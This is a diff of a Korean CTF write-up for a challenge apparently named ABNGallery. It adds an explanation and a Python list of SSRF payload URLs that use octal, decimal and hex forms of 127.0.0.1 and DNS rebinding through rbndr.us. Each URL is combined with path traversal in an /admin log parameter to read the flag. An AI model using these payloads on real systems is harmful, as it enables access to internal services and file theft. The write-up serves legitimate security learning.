@@ -1,5 +1,4 @@
 
-
 ## Explain
 
 ![](web/ABNGallery/image2.png)
@@ -89,8 +88,22 @@ for filename in filenames:
 print("\n[-] All attempts failed. Try increasing attempts or checking the server status.")
 ```
 
+결론적으로 payload는 SSRF(Server-Side Request Forgery) 취약점을 악용하여 외부에서 직접 접근할 수 없는 내부망 서비스(포트 3000)**를 공격하는 스크립트로 구성했다.
+서버의 `127.0.0.1` 문자열 필터링을 무력화하기 위해 8진수 `0177.0.0.1` 같은 IP 난독화와 및 DNS Rebinding 기법을 사용했으며, 동시에 `/admin` 페이지의 파라미터에 Path Traversal(`../`) 공격을 결합하여 로그 디렉터리를 벗어나 시스템 내부의 플래그 파일을 성공적으로 읽어내도록 설계되었다.
 
-
+```python
+payloads = [
+    # [Method 1] Octal IP (0177.0.0.1 -> 127.0.0.1) - 가장 유력
+    f"http://0177.0.0.1:{INTERNAL_PORT}/admin?log=../{{file}}",
+    # [Method 2] Decimal IP (2130706433 -> 127.0.0.1)
+    f"http://2130706433:{INTERNAL_PORT}/admin?log=../{{file}}",
+    # [Method 3] Hex IP (0x7f000001 -> 127.0.0.1)
+    f"http://0x7f000001:{INTERNAL_PORT}/admin?log=../{{file}}",
+    # [Method 4] DNS Rebinding (확률 게임)
+    f"http://7f000001.08080808.rbndr.us:{INTERNAL_PORT}/admin?log=../{{file}}"
+]
+```
+flag를 잘 구하기 위해 우회할 수 있는 IP Obfuscation 기법을 4가지정도 준비했다. 각각 **Octal IP (8진수):** `0177.0.0.1`, **Decimal IP (10진수):** `2130706433`, **Hex IP (16진수):** `0x7f000001`, **DNS Rebinding:** `rbndr.us`를 이용했다.
 
 
 ## Solved
